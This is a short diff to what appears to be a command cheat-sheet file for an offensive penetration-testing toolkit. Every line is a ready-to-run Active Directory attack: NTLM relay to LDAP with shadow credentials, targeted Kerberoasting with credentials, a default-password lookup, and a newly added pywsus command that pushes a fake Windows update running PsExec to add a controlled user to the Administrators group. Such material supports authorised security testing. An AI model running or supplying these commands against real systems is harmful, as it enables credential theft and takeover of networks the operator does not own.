@@ -303,4 +303,5 @@ ntlmrelayx -t ldap://dc02.breaking.bad -smb2support --remove-mic --shadow-creden
 targetedKerberoast.py -v -d domain.local -u user1 -p complexpassword -o kerberoastables.txt
 pass-station search tomcat
 nth --text 5f4dcc3b5aa765d61d8327deb882cf99
+pywsus.py --host 192.168.56.1 --port 8530 --executable /opt/resources/windows/sysinternals/PsExec64.exe --command '/accepteula /s cmd.exe /c "net localgroup Administrators DOMAIN\controlleduser /add"'
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
